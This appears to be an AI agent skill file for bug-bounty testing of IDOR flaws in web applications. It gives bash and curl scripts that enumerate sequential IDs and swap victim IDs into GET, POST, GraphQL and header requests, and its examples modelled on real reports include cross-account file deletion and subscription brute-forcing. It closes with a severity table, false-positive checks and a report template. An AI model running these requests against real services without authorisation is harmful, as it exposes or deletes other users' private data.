---
description: Find IDOR vulnerabilities in web applications. Use when testing for IDOR issues.
---

# IDOR Vulnerability Testing Framework

## High-Value Patterns from Real Reports

### Common Vulnerable Parameter Names
```bash
# Primary targets - test these parameters first
IDOR_PARAMS=(
    "id" "user_id" "subscription_id" "campaign_id" "label_ids" "photo_ids"
    "media_code" "board_id" "res_id" "responder_user_id" "attachment_ids"
    "application[id]" "data-id" "external_status_check_id" "file_id"
    "thread_id" "message_id" "course_id" "order_id" "epic_id" "parent_id"
)
```

### Vulnerable Endpoint Patterns
```bash
# API endpoints frequently vulnerable to IDOR
IDOR_ENDPOINTS=(
    "/api/*/users/{id}/*" 
    "/*/boards/{board_id}.json"
    "/*/{username}/{project}/boards/{id}"
    "/admin/apps/*/shop_screenshots/{id}"
    "/settings/*/authtokens/wipe/{id}"
    "/remote.php/dav/calendars/{userId}"
    "/php/client_manage_handler?*photo_ids={id}"
    "/campaign-manager-api/campaignManagerAccounts/{id}/*"
    "/api/v1/messages/{id}/"
    "/graphql" # Check variables for ID parameters
)
```

### ID Type Patterns to Test
- **Sequential integers**: 1, 2, 3, 123456
- **UUIDs**: Generate variations of found UUIDs
- **Base64 encoded**: Decode, modify, re-encode
- **Prefixed IDs**: gid://, user_, msg_, file:
- **Composite IDs**: user123_file456

## Discovery Commands

### 1. Find ID Parameters in Responses
```bash
# Extract potential ID parameters from HTTP responses
find_ids() {
    local url="$1"
    curl -s "$url" -H "Authorization: Bearer $TOKEN" | \
    grep -oE '"[a-zA-Z_]*[Ii][Dd][a-zA-Z_]*":\s*[0-9]+' | \
    sort -u > potential_ids.txt
    echo "Found potential ID parameters:"
    cat potential_ids.txt
}

# Example usage
find_ids "https://target.com/api/user/profile"
```

### 2. Enumerate Sequential IDs
```bash
# Test sequential ID enumeration
test_sequential_ids() {
    local base_url="$1"
    local start_id="$2"
    local end_id="$3"
    
    for id in $(seq $start_id $end_id); do
        response=$(curl -s -w "%{http_code}" -o /tmp/response_$id.txt \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            "$base_url/$id")
        
        if [[ "$response" == "200" ]]; then
            echo "SUCCESS: ID $id returned 200"
            echo "Response saved to /tmp/response_$id.txt"
        elif [[ "$response" == "403" ]]; then
            echo "FORBIDDEN: ID $id exists but access denied"
        fi
    done
}
```

### 3. GraphQL IDOR Detection
```bash
# Extract GraphQL operations with ID parameters
test_graphql_idor() {
    local endpoint="$1"
    local operation="$2"
    local victim_id="$3"
    
    curl -X POST "$endpoint" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $TOKEN" \
        -d "{\"operationName\":\"$operation\",\"variables\":{\"id\":\"$victim_id\"}}" \
        -v 2>&1 | tee graphql_response.txt
}
```

## Step-by-Step Testing Methodology

### Phase 1: Reconnaissance
```bash
# 1. Map all endpoints with ID parameters
grep -r "id.*=" proxy_logs/ | grep -E "(GET|POST|PUT|DELETE)" > id_endpoints.txt

# 2. Extract unique ID formats
cat id_endpoints.txt | grep -oE 'id=([^&\s]+)' | sort -u > id_formats.txt

# 3. Identify ID ranges
echo "Checking ID ranges..."
for id in $(cat id_formats.txt | cut -d= -f2 | head -10); do
    echo "Testing around ID: $id"
done
```

### Phase 2: Basic IDOR Testing
```bash
# Test parameter manipulation in GET requests
test_get_idor() {
    local url="$1"
    local param="$2"
    local original_id="$3"
    local test_id="$4"
    
    # Original request
    original_resp=$(curl -s -w "%{http_code}" -b "session=valid_session" "$url?$param=$original_id")
    
    # Modified request  
    test_resp=$(curl -s -w "%{http_code}" -b "session=valid_session" "$url?$param=$test_id")
    
    echo "Original ($original_id): ${original_resp: -3}"
    echo "Modified ($test_id): ${test_resp: -3}"
}

# Example
test_get_idor "https://target.com/api/profile" "user_id" "123" "124"
```

### Phase 3: POST/PUT IDOR Testing
```bash
# Test IDOR in POST request body
test_post_idor() {
    local url="$1"
    local original_data="$2"
    local victim_id="$3"
    
    # Replace ID in JSON payload
    modified_data=$(echo "$original_data" | sed "s/\"id\":[0-9]*/\"id\":$victim_id/g")
    
    curl -X POST "$url" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $TOKEN" \
        -d "$modified_data" \
        -v > post_idor_test.txt 2>&1
        
    echo "Response saved to post_idor_test.txt"
}
```

### Phase 4: Header-based IDOR
```bash
# Test IDOR via custom headers
test_header_idor() {
    local url="$1"
    local header_name="$2"
    local victim_id="$3"
    
    curl -H "$header_name: $victim_id" \
        -H "Authorization: Bearer $TOKEN" \
        "$url" -v 2>&1 | grep -E "(HTTP|Location|Set-Cookie)"
}

# Common header patterns
test_header_idor "https://target.com/api/data" "X-User-ID" "987654"
test_header_idor "https://target.com/api/data" "X-Account-ID" "victim123"
```

## Concrete Testing Examples

### 1. GitLab Board Labels IDOR
```bash
# Test GitLab-style board IDOR
curl -X PUT "https://target.com/username/project/boards/857058.json" \
    -H "Content-Type: application/json" \
    -H "Cookie: session=your_session" \
    -d '{"board":{"id":857058,"name":"Test","label_ids":[12345,67890]}}' \
    -v
```

### 2. Zomato Subscription IDOR  
```bash
# Test subscription details access
for sub_id in {1000000..1000100}; do
    response=$(curl -s -w "%{http_code}" \
        "https://target.com/gold/payment-success?subscription_id=$sub_id&user_id=12345")
    if [[ "${response: -3}" == "200" ]]; then
        echo "Accessible subscription: $sub_id"
    fi
done
```

### 3. File Deletion IDOR
```bash
# Test file deletion across accounts
test_file_deletion() {
    local file_id="$1"
    curl -X GET "https://target.com/php/client_manage_handler?case=remove-active-photo&photo_ids=$file_id" \
        -H "Cookie: session=attacker_session" \
        -v
}

# Test with victim's file IDs
test_file_deletion "85952"
test_file_deletion "85953"
```

### 4. Course Editing IDOR
```bash
# Test course/education modification
curl -X POST "https://target.com/courses/edit" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=attacker_session" \
    -d "id=victim_course_id&name=Modified%20Course&action=save" \
    -v
```

## Severity Rating Table

| Impact Level | Criteria | CVSS Range |
|-------------|----------|------------|
| **Critical (9.0-10.0)** | Account takeover, financial data access, admin privilege escalation | Full system compromise |
| **High (7.0-8.9)** | PII access, file deletion, private data disclosure, payment info | Cross-account data access |
| **Medium (4.0-6.9)** | Limited info disclosure, non-sensitive data access | Enumeration of resources |
| **Low (0.1-3.9)** | Public info disclosure, non-impactful enumeration | Minimal privacy impact |

### Impact Assessment Examples
```bash
# Critical: Email change leading to account takeover
echo "CRITICAL: Can change victim email via user_id parameter"

# High: Private file access
echo "HIGH: Can access private photos via photo_ids parameter"  

# Medium: Subscription info disclosure
echo "MEDIUM: Can view subscription details via subscription_id"

# Low: Public course enumeration
echo "LOW: Can enumerate public course IDs"
```

## False Positives to Ignore

### 1. Public Resource Access
```bash
# These are NOT vulnerabilities
ignore_if_public() {
    local response="$1"
    # Public user profiles, open courses, public files
    if echo "$response" | grep -q '"visibility":"public"'; then
        echo "FALSE POSITIVE: Resource is public"
        return 1
    fi
}
```

### 2. Expected Access Patterns
```bash
# Admin users accessing all resources
if [[ "$USER_ROLE" == "admin" ]]; then
    echo "FALSE POSITIVE: Admin has legitimate access"
fi

# Shared resources in same organization
if echo "$response" | grep -q '"shared":true'; then
    echo "FALSE POSITIVE: Resource is shared"
fi
```

### 3. Rate Limited or Cached Responses
```bash
# Check for rate limiting false positives  
if echo "$response" | grep -qE "(429|rate.limit|too.many.requests)"; then
    echo "FALSE POSITIVE: Rate limited, retry later"
fi
```

## Finding Report Template

```markdown
# IDOR Vulnerability Report

## Summary
[One-line description of the vulnerability]

## Vulnerable Endpoint
**URL:** [Full URL with parameters]  
**Method:** [GET/POST/PUT/DELETE]  
**Parameter:** [Vulnerable parameter name]

## Proof of Concept

### Setup
- Attacker Account: [account details]
- Victim Account: [account details]  
- Vulnerable Parameter: `{parameter_name}`

### Exploitation Steps
1. [Step 1 with curl command]
2. [Step 2 with curl command]  
3. [Step 3 with curl command]

### Curl Command
```bash
curl -X [METHOD] "[URL]" \
    -H "Authorization: Bearer [TOKEN]" \
    -H "Content-Type: application/json" \
    -d '{"id": "[VICTIM_ID]"}' \
    -v
```

### Response Analysis
```
HTTP/1.1 200 OK
Content-Type: application/json

{
    "user_email": "victim@example.com",
    "private_data": "sensitive_info"
}
```

## Impact Assessment
- **Severity:** [Critical/High/Medium/Low]
- **CVSS Score:** [0.0-10.0]
- **Affected Users:** [Number or scope]
- **Data at Risk:** [Type of sensitive data]

## Affected Resources
- [ ] User profiles and PII
- [ ] Financial/payment data  
- [ ] Private files/documents
- [ ] Administrative functions
- [ ] Other: [specify]

## Remediation
1. Implement proper authorization checks
2. Validate user ownership of resources
3. Use UUIDs instead of sequential IDs
4. Log and monitor suspicious access patterns

## Timeline
- **Discovered:** [Date]
- **Reported:** [Date]  
- **Verified:** [Date]
```